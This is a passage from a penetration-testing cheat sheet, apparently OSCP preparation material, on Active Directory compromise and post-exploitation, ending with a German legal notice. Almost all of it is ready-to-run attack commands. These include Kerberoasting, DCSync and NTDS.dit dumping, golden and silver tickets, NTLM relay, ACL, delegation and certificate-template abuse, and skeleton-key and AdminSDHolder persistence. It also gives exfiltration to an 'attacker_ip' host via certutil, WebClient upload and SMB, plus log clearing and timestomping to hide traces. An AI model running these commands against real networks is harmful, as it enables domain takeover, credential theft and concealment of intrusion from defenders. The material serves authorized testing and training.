Clear-EventLog -LogName Security
Clear-EventLog -LogName System
```

---

# Phase 4: Active Directory Methodology

## AD Initial Foothold

### Assume Breach Scenarios
```text
1. Phishing → User credentials
2. Network Access → LLMNR/NBT-NS Poisoning
3. Compromised workstation → Local user
4. VPN Access → Domain user
5. Web Application → MSSQL xp_cmdshell → Domain context
```

### Initial Enumeration (No Credentials)
```bash
# DNS Enumeration
nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.local

# NetBIOS Name
nbtscan 192.168.1.0/24

# Responder (Credential Capture)
responder -I eth0 -wrf

# AS-REP Roasting (no credentials)
GetNPUsers.py domain.local/ -dc-ip 192.168.1.10 -usersfile users.txt -format hashcat

# Check for Null Sessions
crackmapexec smb 192.168.1.10 -u '' -p ''
rpcclient -U "" -N 192.168.1.10

# SMB Signing Check (for Relay attacks)
crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
```

---

## AD Domain Enumeration

### Domain Information
```powershell
# PowerView (SharpView for .NET)
# Import Module
Import-Module .\PowerView.ps1

# Domain Info
Get-Domain
Get-DomainController
Get-DomainPolicy
Get-DomainTrust

# Forest Info
Get-Forest
Get-ForestDomain
Get-ForestTrust

# Alternative: Native PowerShell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# LDAP
ldapsearch -x -h dc.domain.local -s base namingcontexts
```

### BloodHound Data Collection
```powershell
# SharpHound (on Windows)
.\SharpHound.exe -c All --zipfilename output.zip
.\SharpHound.exe -c All,GPOLocalGroup --zipfilename output.zip

# Bloodhound-python (from Kali)
bloodhound-python -d domain.local -u user -p password -ns 192.168.1.10 -c all

# Import to BloodHound
# Start Neo4j
sudo neo4j start
# Start BloodHound
bloodhound

# Pre-Built Queries:
# - Find all Domain Admins
# - Shortest Paths to Domain Admins
# - Find Kerberoastable Accounts
# - Find AS-REP Roastable Accounts
# - Find Computers with Unconstrained Delegation
```

---

## User Enumeration

### Get All Users
```powershell
# PowerView
Get-DomainUser
Get-DomainUser | Select-Object samaccountname,description

# Filter Users with SPN (Kerberoastable)
Get-DomainUser -SPN

# Users with "Password Not Required"
Get-DomainUser -UACFilter DONT_REQ_PREAUTH

# Users with "Password Never Expires"
Get-DomainUser -UACFilter DONT_EXPIRE_PASSWORD

# Native AD Module
Get-ADUser -Filter * -Properties *

# LDAP
ldapsearch -x -h dc.domain.local -D "CN=user,CN=Users,DC=domain,DC=local" -w password -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName
```

### User Details
```powershell
# PowerView
Get-DomainUser -Identity administrator
Get-DomainUser -Identity administrator | Select-Object *

# Check Last Logon
Get-DomainUser | Select-Object samaccountname,lastlogon

# Check Password Last Set
Get-DomainUser | Select-Object samaccountname,pwdlastset
```

### Service Accounts (SPNs)
```powershell
# PowerView
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname

# Impacket (from Kali)
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.10 -request

# Kerberoast
# Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt

# Crack with Hashcat
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## Group Enumeration

### Domain Groups
```powershell
# PowerView
Get-DomainGroup
Get-DomainGroup | Select-Object samaccountname

# Domain Admins
Get-DomainGroupMember -Identity "Domain Admins"

# Enterprise Admins
Get-DomainGroupMember -Identity "Enterprise Admins"

# Administrators (Local Admin on DCs)
Get-DomainGroupMember -Identity "Administrators"

# Native
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain

# LDAP
ldapsearch -x -h dc.domain.local -D "CN=user,CN=Users,DC=domain,DC=local" -w password -b "DC=domain,DC=local" "(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=local)"
```

### Nested Groups
```powershell
# PowerView
Get-DomainGroup "Domain Admins" -Recurse

# Check User's Groups (including nested)
Get-DomainGroup -MemberIdentity username
```

---

## Computer Enumeration

### All Computers
```powershell
# PowerView
Get-DomainComputer
Get-DomainComputer | Select-Object name,operatingsystem,dnshostname

# Filter by OS
Get-DomainComputer -OperatingSystem "*Server*"
Get-DomainComputer -OperatingSystem "*Windows 10*"

# Native
Get-ADComputer -Filter * -Properties OperatingSystem

# Ping Sweep (live hosts)
Get-DomainComputer | ForEach-Object { Test-Connection -ComputerName $_.dnshostname -Count 1 -Quiet }
```

### Domain Controllers
```powershell
# PowerView
Get-DomainController

# Native
nltest /dclist:domain.local
```

### Computers with Specific Properties
```powershell
# Unconstrained Delegation
Get-DomainComputer -Unconstrained

# Constrained Delegation
Get-DomainComputer -TrustedToAuth

# LAPS Enabled
Get-DomainComputer | Where-Object {$_.ms-mcs-admpwdexpirationtime}
```

---

## Trust Relationships

### Domain Trusts
```powershell
# PowerView
Get-DomainTrust
Get-DomainTrustMapping

# Native
nltest /domain_trusts

# Check if Bidirectional, Transitive
Get-DomainTrust | Select-Object SourceName,TargetName,TrustType,TrustDirection
```

### Forest Trusts
```powershell
Get-ForestTrust
```

---

## GPO Enumeration

### List GPOs
```powershell
# PowerView
Get-DomainGPO
Get-DomainGPO | Select-Object displayname,gpcfilesyspath

# GPOs applied to specific computer
Get-DomainGPO -ComputerIdentity target-pc

# Find GPOs with specific rights (e.g., for GPO abuse)
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl") -and ($_.ObjectType -match "GroupPolicyContainer")}
```

### GPO Files (if accessible)
```cmd
# GPOs stored in SYSVOL
dir \\domain.local\SYSVOL\domain.local\Policies\ /s

# Search for interesting files
findstr /si password \\domain.local\SYSVOL\domain.local\Policies\*\*

# Groups.xml (cpassword)
# Decrypt with:
gpp-decrypt <cpassword_value>
```

---

## Credential Harvesting (AD)

### Kerberoasting
```powershell
# PowerView + Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Impacket (from Kali)
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.10 -request -outputfile hashes.txt

# Crack
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### AS-REP Roasting
```powershell
# Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

# Impacket (from Kali)
GetNPUsers.py domain.local/user:password -dc-ip 192.168.1.10 -request -outputfile hashes.txt

# Without credentials (if you have username list)
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 192.168.1.10 -format hashcat -outputfile hashes.txt

# Crack
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
```

### DCSync
```powershell
# Mimikatz (requires Replicating Directory Changes rights)
mimikatz.exe "lsadump::dcsync /domain:domain.local /user:Administrator" exit
mimikatz.exe "lsadump::dcsync /domain:domain.local /all /csv" exit

# Impacket (from Kali)
secretsdump.py domain.local/user:password@dc.domain.local -just-dc-ntlm

# Requires:
# - Replicating Directory Changes
# - Replicating Directory Changes All
# - Replicating Directory Changes In Filtered Set (optional)
```

### NTDS.dit Extraction
```bash
# Via Volume Shadow Copy (on DC)
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\

# Extract hashes (on Kali)
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

# Via CrackMapExec (remote)
crackmapexec smb dc.domain.local -u admin -p password --ntds
```

---

## Kerberos Attacks

### Pass-the-Ticket (PtT)
```powershell
# Export Tickets (Mimikatz)
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit

# Import Ticket (Mimikatz)
mimikatz.exe "kerberos::ptt ticket.kirbi" exit

# Export Tickets (Rubeus)
.\Rubeus.exe dump

# Import Ticket (Rubeus)
.\Rubeus.exe ptt /ticket:base64ticket

# Use Ticket
dir \\dc.domain.local\C$
```

### Overpass-the-Hash (Pass-the-Key)
```powershell
# Rubeus (NTLM Hash → TGT)
.\Rubeus.exe asktgt /user:administrator /rc4:ntlmhash /ptt

# With AES Key (better OPSEC)
.\Rubeus.exe asktgt /user:administrator /aes256:aes256key /ptt

# Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:administrator /domain:domain.local /ntlm:ntlmhash /run:powershell.exe" exit
```

### Golden Ticket
```powershell
# Requirements:
# - krbtgt NTLM hash (via DCSync or NTDS.dit)
# - Domain SID
# - Domain Name

# Get Domain SID
Get-DomainSID

# Mimikatz
mimikatz.exe "kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:krbtgt_ntlm /id:500 /ptt" exit

# Rubeus (create + inject)
.\Rubeus.exe golden /rc4:krbtgt_ntlm /domain:domain.local /sid:S-1-5-21-... /user:Administrator /ptt

# Now: Access ANY machine in domain
dir \\any-machine.domain.local\C$
```

### Silver Ticket
```powershell
# Requirements:
# - Service account NTLM hash (e.g., machine account)
# - Target service SPN

# Mimikatz
mimikatz.exe "kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:srv01.domain.local /service:cifs /rc4:service_ntlm /ptt" exit

# Access specific service
dir \\srv01.domain.local\C$
```

---

## NTLM Attacks

### NTLM Relay
```bash
# 1. Identify targets without SMB signing
crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt

# 2. Setup ntlmrelayx
ntlmrelayx.py -tf relay_targets.txt -smb2support

# 3. Capture NTLM Auth (Responder)
responder -I eth0 -wrf

# 4. Relay to Target → Command Execution
ntlmrelayx.py -t 192.168.1.50 -smb2support -c "whoami"

# 5. Relay to LDAPS (privilege escalation)
ntlmrelayx.py -t ldaps://dc.domain.local -smb2support --escalate-user lowpriv
```

### LLMNR/NBT-NS Poisoning
```bash
# Responder (Capture Hashes)
responder -I eth0 -wrf

# Wait for events (users mistyping shares, etc.)
# Captured hashes: /usr/share/responder/logs/

# Crack with Hashcat
hashcat -m 5600 ntlmv2_hash.txt /usr/share/wordlists/rockyou.txt
```

### IPv6 DNS Takeover (mitm6)
```bash
# mitm6
mitm6 -d domain.local

# Combined with ntlmrelayx (in another terminal)
ntlmrelayx.py -6 -t ldaps://dc.domain.local -wh attacker-wpad.domain.local -l loot

# Wait for IPv6-enabled machines to auth
# Can create new computer accounts, modify ACLs, etc.
```

---

## ACL Abuse

### Find Interesting ACLs
```powershell
# PowerView - Find where user/group has GenericAll/GenericWrite/etc
Find-InterestingDomainAcl -ResolveGUIDs

# Specific Object
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs

# Where current user has rights
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq (Get-DomainUser -Identity currentuser).objectsid}

# BloodHound: Outbound Object Control → Shortest Paths
```

### GenericAll / GenericWrite Abuse
```powershell
# If GenericAll on User → Reset Password
net user targetuser newpassword /domain

# PowerView
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# If GenericAll on Group → Add Member
net group "Domain Admins" currentuser /add /domain

# PowerView
Add-DomainGroupMember -Identity "Domain Admins" -Members currentuser
```

### WriteDACL
```powershell
# If WriteDACL on Object → Grant yourself GenericAll
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity currentuser -Rights All
```

### WriteOwner
```powershell
# If WriteOwner → Change owner → Modify ACL
Set-DomainObjectOwner -Identity targetobject -OwnerIdentity currentuser
Add-DomainObjectAcl -TargetIdentity targetobject -PrincipalIdentity currentuser -Rights All
```

---

## Delegation Abuse

### Unconstrained Delegation
```powershell
# Find Computers with Unconstrained Delegation
Get-DomainComputer -Unconstrained

# Compromise computer with Unconstrained Delegation
# Wait for privileged user (e.g., Domain Admin) to auth
# Rubeus monitor
.\Rubeus.exe monitor /interval:5

# Force authentication (e.g., Printer Bug)
.\SpoolSample.exe dc.domain.local compromised-machine.domain.local

# Rubeus captures TGT → extract → DCSync
```

### Constrained Delegation
```powershell
# Find Accounts with Constrained Delegation
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# S4U2Proxy Abuse (Rubeus)
# If user A can delegate to service B:
.\Rubeus.exe s4u /user:userA /rc4:userA_ntlm /impersonateuser:Administrator /msdsspn:cifs/targetserver.domain.local /ptt

# Access target
dir \\targetserver.domain.local\C$
```

### Resource-Based Constrained Delegation (RBCD)
```powershell
# Requirements: GenericAll/GenericWrite/WriteProperty on target computer

# Create new computer account (if allowed)
import-module .\Powermad.ps1
New-MachineAccount -MachineAccount attacker01 -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# Configure RBCD on target
$ComputerSid = Get-DomainComputer -Identity attacker01 -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer -Identity targetcomputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# S4U Attack (Rubeus)
.\Rubeus.exe hash /password:Password123! /user:attacker01$ /domain:domain.local
.\Rubeus.exe s4u /user:attacker01$ /rc4:hash /impersonateuser:Administrator /msdsspn:cifs/targetcomputer.domain.local /ptt

# Access target
dir \\targetcomputer.domain.local\C$
```

---

## Certificate Services Abuse

### Certipy Enumeration
```bash
# Enumerate AD CS (from Kali)
certipy find -u user@domain.local -p password -dc-ip 192.168.1.10

# Vulnerable Templates
certipy find -u user@domain.local -p password -dc-ip 192.168.1.10 -vulnerable
```

### ESC1 - Misconfigured Certificate Template
```bash
# If template allows SAN and enrollment rights
certipy req -u user@domain.local -p password -dc-ip 192.168.1.10 -ca CA-Name -template VulnerableTemplate -upn administrator@domain.local

# Authenticate with Certificate
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10
# → Receives TGT + NTLM hash
```

### ESC8 - NTLM Relay to AD CS HTTP Endpoints
```bash
# Relay to AD CS Web Enrollment
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs

# Responder to capture auth
responder -I eth0 -wrf
```

---

## Domain Dominance

### Post-Compromise with Domain Admin

#### DCSync All Hashes
```powershell
# Mimikatz
mimikatz.exe "lsadump::dcsync /domain:domain.local /all /csv" exit

# Impacket
secretsdump.py domain.local/admin:password@dc.domain.local -just-dc-ntlm -outputfile domain_hashes
```

#### Golden Ticket Persistence
```powershell
# Already covered, but critical for persistence
mimikatz.exe "kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:krbtgt_ntlm /id:500 /ptt" exit
```

#### Skeleton Key (Backdoor)
```powershell
# Inject Skeleton Key into LSASS on DC
mimikatz.exe "privilege::debug" "misc::skeleton" exit

# Now any user can auth with password "mimikatz"
net use \\dc.domain.local /user:administrator mimikatz
```

#### SID History Injection
```powershell
# Add SID of Domain Admins to user SID History (Golden Ticket)
mimikatz.exe "kerberos::golden /user:lowpriv /domain:domain.local /sid:S-1-5-21-... /krbtgt:krbtgt_ntlm /sids:S-1-5-21-...-512 /ptt" exit
```

#### AdminSDHolder Persistence
```powershell
# Modify AdminSDHolder to add user to Protected Groups
# User will be re-added to Domain Admins every 60 minutes via SDProp
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity attacker -Rights All
```

#### LAPS Dumping
```powershell
# If LAPS deployed, dump local admin passwords
# PowerView
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ObjectAceType -eq "ms-Mcs-AdmPwd"} | Select-Object ObjectDN, SecurityIdentifier

# LAPSToolkit
Get-LAPSPasswords
```

---

# Phase 5: Post-Exploitation

## Data Exfiltration

### Interesting Files
```powershell
# Search for files
Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.docx,*.xlsx -File -Recurse -ErrorAction SilentlyContinue

# Search for keywords
Get-ChildItem -Path C:\ -Include *.txt,*.xml,*.config -File -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password","api_key","secret" -List

# User Files
Get-ChildItem -Path C:\Users\*\Documents,C:\Users\*\Desktop -Include *.* -File -Recurse

# Database Files
Get-ChildItem -Path C:\ -Include *.mdf,*.ldf,*.bak,*.sql -File -Recurse -ErrorAction SilentlyContinue
```

### Transfer Methods
```bash
# SMB (to Kali SMB server)
copy file.txt \\attacker_ip\share\

# HTTP (Python server on Kali)
python3 -m http.server 80
# On Windows:
certutil -urlcache -split -f http://attacker_ip/file.txt output.txt

# PowerShell Download/Upload
(New-Object Net.WebClient).UploadFile('http://attacker_ip:8000/upload', 'C:\file.txt')

# Base64 Encode + Copy
certutil -encode file.txt file.b64
type file.b64
# Paste to Kali, decode:
base64 -d file.b64 > file.txt
```

---

## Covering Tracks

### Clear Event Logs
```cmd
# Clear All
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# PowerShell
Clear-EventLog -LogName Security, System, Application
```

### Delete Files
```cmd
# Delete uploaded tools
del C:\temp\*.exe /f /q

# Secure Delete (if sdelete available)
sdelete64.exe -p 10 C:\temp\payload.exe
```

### Clear PowerShell History
```powershell
# Clear current session
Clear-History

# Delete PSReadLine history
Remove-Item $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### Remove Scheduled Tasks / Services
```cmd
# Delete Task
schtasks /delete /tn TaskName /f

# Delete Service
sc delete ServiceName
```

### Timestomp (Change Timestamps)
```cmd
# Metasploit Meterpreter
timestomp C:\Windows\System32\evil.dll -m "01/01/2020 12:00:00"
```

---

## Quick Reference Checklists

### Windows Standalone Checklist
- [ ] Initial Enumeration (systeminfo, whoami, ipconfig)
- [ ] User & Group Enumeration
- [ ] Network & Processes
- [ ] Installed Software & Services
- [ ] Credential Hunting (SAM, LSASS, Registry, Files)
- [ ] Privilege Escalation (WinPEAS, PowerUp)
- [ ] Exploit Privilege Escalation Vector
- [ ] Persistence (Registry, Scheduled Task, Service)
- [ ] Credential Dumping (post-admin)
- [ ] Data Exfiltration
- [ ] Cover Tracks

### Active Directory Checklist
- [ ] Initial Foothold (credentials or access)
- [ ] Domain Enumeration (domain, DCs, users, computers, groups)
- [ ] BloodHound Collection & Analysis
- [ ] Kerberoasting (if SPNs available)
- [ ] AS-REP Roasting (if applicable)
- [ ] LLMNR/NTLM Relay (if SMB signing disabled)
- [ ] Check for ACL misconfigurations
- [ ] Check for Delegation issues
- [ ] Check for AD CS vulnerabilities
- [ ] Lateral Movement to high-value targets
- [ ] Obtain Domain Admin (or equivalent)
- [ ] DCSync / NTDS.dit extraction
- [ ] Golden Ticket for persistence
- [ ] Document all findings
- [ ] Clean up artifacts

---

## Tool Summary

### Enumeration Tools
| Tool | Purpose | Platform |
|------|---------|----------|
| Nmap | Port scanning | Linux |
| AutoRecon | Automated enumeration | Linux |
| enum4linux-ng | SMB/AD enumeration | Linux |
| PowerView | AD enumeration | Windows |
| BloodHound | AD attack paths | Both |
| WinPEAS | Privilege escalation enum | Windows |
| ldapdomaindump | LDAP dumping | Linux |

### Exploitation Tools
| Tool | Purpose | Platform |
|------|---------|----------|
| Mimikatz | Credential dumping, Kerberos | Windows |
| Rubeus | Kerberos attacks | Windows |
| Impacket Suite | Various (psexec, secretsdump, etc.) | Linux |
| CrackMapExec | Multi-protocol attacks | Linux |
| Responder | LLMNR/NBT-NS poisoning | Linux |
| ntlmrelayx | NTLM relay | Linux |
| Certipy | AD CS attacks | Linux |

### Post-Exploitation
| Tool | Purpose | Platform |
|------|---------|----------|
| Metasploit | General post-exploitation | Linux |
| Cobalt Strike | C2 framework | Linux |
| Empire | PowerShell C2 | Linux/Windows |

---

## Rechtliche Hinweise

Diese Methoden dürfen NUR verwendet werden für:
- Autorisierte Penetrationstests mit schriftlicher Genehmigung
- CTF-Wettbewerbe und Security Challenges
- Sicherheitsforschung in kontrollierten Umgebungen
- Red Team Assessments mit definiertem Scope
- Defensive Security und Detection Engineering

Unbefugte Nutzung verstößt gegen CFAA (USA), Computer Misuse Act (UK), StGB §202a-c (DE) und ähnliche Gesetze weltweit.

---

**Erstellt**: 2025-10-30
**Kontext**: Autorisierter Penetrationstest / OSCP Vorbereitung
**Zielgruppe**: Penetration Testers, Red Teamers, Security Researchers
**Komplexität**: Umfassende Methodik von Initial Access bis Domain Dominance
